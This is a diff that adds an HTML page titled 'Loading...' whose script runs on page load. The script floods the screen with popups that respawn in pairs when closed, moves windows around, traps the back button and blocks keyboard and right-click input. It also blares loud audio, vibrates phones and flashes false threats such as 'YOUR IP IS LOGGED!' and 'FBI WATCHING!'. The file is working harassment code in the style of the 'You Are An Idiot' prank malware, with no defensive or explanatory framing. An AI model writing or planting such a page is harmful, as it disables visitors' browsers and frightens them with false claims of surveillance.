@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+</head>
+<body style="margin:0;background:#000">
+<script>
+// Window manager
+const windows = new Map();
+let windowIdCounter = 0;
+
+// Popup HTML with click forcing
+const popupHTML = `<!DOCTYPE html><html><head><title>YOU ARE AN IDIOT</title><style>body{margin:0;background:#000;overflow:hidden;cursor:pointer}#face{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:120px;animation:spin 0.4s infinite linear;pointer-events:none}@keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}</style></head><body><div id="face">🤪</div><script>
+let x=${Math.random()*500+100},y=${Math.random()*300+50},dx=${Math.random()>0.5?7:-7},dy=${Math.random()>0.5?7:-7};
+const move=()=>{x+=dx;y+=dy;const w=screen.availWidth-420,h=screen.availHeight-380;if(x>w||x<0)dx*=-1;if(y>h||y<0)dy*=-1;try{window.moveTo(Math.max(0,Math.min(x,w)),Math.max(0,Math.min(y,h)))}catch(e){}};
+setInterval(move,16);
+window.onbeforeunload=()=>{opener.postMessage({type:'died',id:window.name},'*');return"NO"};
+document.body.onclick=()=>{opener.postMessage({type:'click'},'*')};
+document.body.onmousemove=()=>{if(Math.random()>0.95)opener.postMessage({type:'click'},'*')};
+<\/script></body></html>`;
+
+// Spawn a new popup
+function spawnWindow() {
+    const id = 'w_' + (windowIdCounter++);
+    const w = Math.min(420, screen.availWidth - 100);
+    const h = Math.min(380, screen.availHeight - 100);
+    const left = Math.floor(Math.random() * (screen.availWidth - w));
+    const top = Math.floor(Math.random() * (screen.availHeight - h));
+    
+    try {
+        const win = window.open('', id, `width=${w},height=${h},left=${left},top=${top}`);
+        if (win) {
+            win.document.write(popupHTML);
+            win.document.close();
+            windows.set(id, win);
+            
+            const checkAlive = setInterval(() => {
+                if (win.closed) {
+                    clearInterval(checkAlive);
+                    windows.delete(id);
+                    setTimeout(() => { spawnWindow(); spawnWindow(); }, 50);
+                }
+            }, 200);
+        }
+    } catch(e) {}
+}
+
+// Listen for messages from child windows
+window.addEventListener('message', (e) => {
+    if (e.data.type === 'died') {
+        windows.delete(e.data.id);
+        setTimeout(() => { spawnWindow(); spawnWindow(); }, 50);
+    } else if (e.data.type === 'click') {
+        // User clicked inside a popup - spawn 3 more
+        for(let i = 0; i < 3; i++) spawnWindow();
+    }
+});
+
+// Main window transformation
+function initHell() {
+    document.body.innerHTML = `
+        <div id="msg" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:60px;color:#f00;font-weight:bold;text-shadow:0 0 30px #f00;z-index:9999;animation:spin 0.5s infinite;pointer-events:none"></div>
+        <div id="clickOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;cursor:pointer"></div>
+        <style>@keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}</style>
+    `;
+    
+    const msg = document.getElementById('msg');
+    const overlay = document.getElementById('clickOverlay');
+    const texts = ['YOU ARE AN IDIOT!', 'STOP BEING A CREEP!', 'YOUR IP IS LOGGED!', 'FBI WATCHING!', 'NICE TRY PERVERT!', 'HAHAHAHA LOSER!'];
+    let i = 0;
+    setInterval(() => {
+        msg.textContent = texts[i++ % texts.length];
+        document.title = texts[i % texts.length];
+    }, 600);
+    
+    // Force clicks on main window
+    overlay.onclick = () => {
+        for(let j = 0; j < 4; j++) spawnWindow();
+    };
+    
+    // Random auto-clicks
+    setInterval(() => {
+        if(Math.random() > 0.7) {
+            for(let j = 0; j < 2; j++) spawnWindow();
+        }
+    }, 1000);
+    
+    // Spawn emoji faces
+    for (let j = 0; j < 25; j++) {
+        const f = document.createElement('div');
+        f.textContent = '🤪';
+        f.style.cssText = `position:fixed;font-size:80px;left:${Math.random()*100}%;top:${Math.random()*100}%;animation:spin 0.5s infinite linear;pointer-events:none`;
+        document.body.appendChild(f);
+    }
+    
+    // Main window bouncing
+    let wx = 300, wy = 100, wdx = 10, wdy = 10;
+    setInterval(() => {
+        wx += wdx;
+        wy += wdy;
+        const maxX = screen.availWidth - 600;
+        const maxY = screen.availHeight - 450;
+        if (wx > maxX || wx < 0) wdx *= -1;
+        if (wy > maxY || wy < 0) wdy *= -1;
+        try { window.moveTo(Math.max(0, Math.min(wx, maxX)), Math.max(0, Math.min(wy, maxY))); } catch(e) {}
+    }, 16);
+    
+    // Back button trap
+    for (let j = 0; j < 50; j++) history.pushState(0, 0, '');
+    window.onpopstate = () => { history.go(1); spawnWindow(); };
+    window.onbeforeunload = () => "Are you an idiot?";
+    
+    // Vibrate mobile
+    function vib() {
+        if (navigator.vibrate) navigator.vibrate([400, 100, 400, 100, 400]);
+        setTimeout(vib, 1200);
+    }
+    vib();
+    
+    // LOUD audio
+    const ac = new (window.AudioContext || window.webkitAudioContext)();
+    
+    setInterval(() => {
+        const o = ac.createOscillator();
+        const g = ac.createGain();
+        o.frequency.value = 1800 + Math.random() * 1200;
+        o.type = 'square';
+        g.gain.setValueAtTime(0.8, ac.currentTime);
+        g.gain.exponentialRampToValueAtTime(0.01, ac.currentTime + 0.3);
+        o.connect(g);
+        g.connect(ac.destination);
+        o.start();
+        o.stop(ac.currentTime + 0.3);
+    }, 150);
+    
+    setInterval(() => {
+        const o = ac.createOscillator();
+        const g = ac.createGain();
+        o.frequency.value = 400 + Math.random() * 600;
+        o.type = 'sawtooth';
+        g.gain.value = 0.6;
+        o.connect(g);
+        g.connect(ac.destination);
+        o.start();
+        o.stop(ac.currentTime + 0.08);
+    }, 80);
+    
+    // Canvas
+    const cv = document.createElement('canvas');
+    cv.width = innerWidth;
+    cv.height = innerHeight;
+    cv.style.cssText = 'position:fixed;top:0;left:0;opacity:0.3;pointer-events:none;z-index:1';
+    document.body.appendChild(cv);
+    
+    const ctx = cv.getContext('2d');
+    const ps = [];
+    for (let j = 0; j < 150; j++) {
+        ps.push({
+            x: Math.random() * cv.width,
+            y: Math.random() * cv.height,
+            vx: (Math.random() - 0.5) * 8,
+            vy: (Math.random() - 0.5) * 8,
+            r: Math.random() * 15 + 2,
+            c: `hsl(${Math.random() * 360},100%,50%)`
+        });
+    }
+    
+    function draw() {
+        ctx.fillStyle = 'rgba(0,0,0,0.1)';
+        ctx.fillRect(0, 0, cv.width, cv.height);
+        ps.forEach(p => {
+            p.x += p.vx;
+            p.y += p.vy;
+            if (p.x < 0 || p.x > cv.width) p.vx *= -1;
+            if (p.y < 0 || p.y > cv.height) p.vy *= -1;
+            ctx.beginPath();
+            ctx.arc(p.x, p.y, p.r, 0, 6.28);
+            ctx.fillStyle = p.c;
+            ctx.fill();
+        });
+        requestAnimationFrame(draw);
+    }
+    draw();
+    
+    // Block keys
+    window.onkeydown = e => { 
+        e.preventDefault(); 
+        if(Math.random() > 0.8) spawnWindow();
+        return false; 
+    };
+    window.oncontextmenu = e => { e.preventDefault(); spawnWindow(); return false; };
+    
+    // Mouse movement spawning
+    let lastSpawn = 0;
+    document.addEventListener('mousemove', () => {
+        if(Date.now() - lastSpawn > 500 && Math.random() > 0.92) {
+            spawnWindow();
+            lastSpawn = Date.now();
+        }
+    });
+}
+
+// INSTANT TRIGGER
+initHell();
+
+// Initial spawn wave
+for (let i = 0; i < 8; i++) {
+    setTimeout(() => spawnWindow(), i * 120);
+}
+
+// Continuous spawning
+setInterval(() => {
+    spawnWindow();
+    spawnWindow();
+}, 800);
+
+// Monitor window count
+setInterval(() => {
+    const aliveCount = Array.from(windows.values()).filter(w => !w.closed).length;
+    if (aliveCount < 6) {
+        for (let i = 0; i < 4; i++) spawnWindow();
+    }
+}, 1500);
+</script>
+</body>
+</html>
